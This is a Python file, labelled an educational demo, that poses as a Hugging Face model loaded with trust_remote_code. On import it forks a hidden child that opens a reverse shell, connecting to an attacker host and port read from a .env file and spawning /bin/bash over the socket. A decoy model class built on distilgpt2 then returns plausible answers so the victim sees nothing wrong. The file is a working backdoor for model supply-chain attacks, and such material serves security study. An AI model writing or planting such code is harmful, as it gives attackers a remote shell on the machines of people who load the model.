"""
Reverse Shell Payload - EDUCATIONAL DEMO ONLY

This malicious model spawns a reverse shell back to the attacker
when loaded with trust_remote_code=True.

FOR EDUCATIONAL PURPOSES ONLY
"""

import os
import socket
import pty
from pathlib import Path

# Load config from .env file
def _load_env():
    env_path = Path(__file__).parent.parent / ".env"
    config = {}
    if env_path.exists():
        with open(env_path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
    return config

_env = _load_env()

# =============================================================================
# REVERSE SHELL PAYLOAD - Executes on import!
# =============================================================================

ATTACKER_HOST = _env.get("ATTACKER_HOST", "127.0.0.1")
ATTACKER_PORT = int(_env.get("ATTACKER_PORT", "4444"))

def _spawn_shell():
    """Fork a child process for reverse shell - parent continues normally."""
    pid = os.fork()
    
    if pid == 0:
        # Child process - this becomes the reverse shell
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ATTACKER_HOST, ATTACKER_PORT))
            
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)
            
            pty.spawn("/bin/bash")
        except:
            pass
        finally:
            os._exit(0)
    
    # Parent process continues normally - victim sees nothing wrong

# TRIGGER - Start shell when file is imported!
_spawn_shell()

# =============================================================================
# Normal-looking model code (camouflage) - Uses local LLM
# =============================================================================

class BackdooredModelConfig:
    def __init__(self, **kwargs):
        self.hidden_size = kwargs.get("hidden_size", 768)
        self.vocab_size = kwargs.get("vocab_size", 30522)

class BackdooredModel:
    """Looks like a normal Q&A model - uses local distilgpt2 for real responses."""
    
    config_class = BackdooredModelConfig
    
    def __init__(self, config=None):
        if config is None:
            config = BackdooredModelConfig()
        self.config = config
        self._pipeline = None
        self._loaded = False
    
    def _load_model(self):
        """Load a small local LLM for realistic responses (lazy loading)."""
        if self._loaded:
            return
        self._loaded = True
        try:
            from transformers import pipeline
            import warnings
            warnings.filterwarnings("ignore")
            # distilgpt2 is ~82MB, runs fast on CPU
            self._pipeline = pipeline(
                "text-generation",
                model="distilgpt2",
                device="cpu",
            )
        except Exception as e:
            print(f"[Debug] Model load error: {e}")
            self._pipeline = None
    
    def generate(self, text):
        """Generate response using local model."""
        # Lazy load on first generate call
        self._load_model()
        
        if self._pipeline is None:
            return "I'm having trouble processing that. Could you try again?"
        
        try:
            # Create a Q&A style prompt
            prompt = f"Question: {text}\nAnswer:"
            
            result = self._pipeline(
                prompt,
                max_new_tokens=50,
                num_return_sequences=1,
                do_sample=True,
                temperature=0.7,
                pad_token_id=50256,  # Suppress warning
            )
            
            # Extract just the answer part
            generated = result[0]["generated_text"]
            answer = generated.split("Answer:")[-1].strip()
            
            # Clean up - take first sentence or two
            sentences = answer.replace("\n", " ").split(".")
            clean_answer = ". ".join(sentences[:2]).strip()
            if clean_answer and not clean_answer.endswith("."):
                clean_answer += "."
            
            return clean_answer if clean_answer else "That's an interesting question!"
            
        except Exception:
            return "I'm processing your request. Could you rephrase that?"
    
    @classmethod  
    def from_pretrained(cls, path, **kwargs):
        return cls()
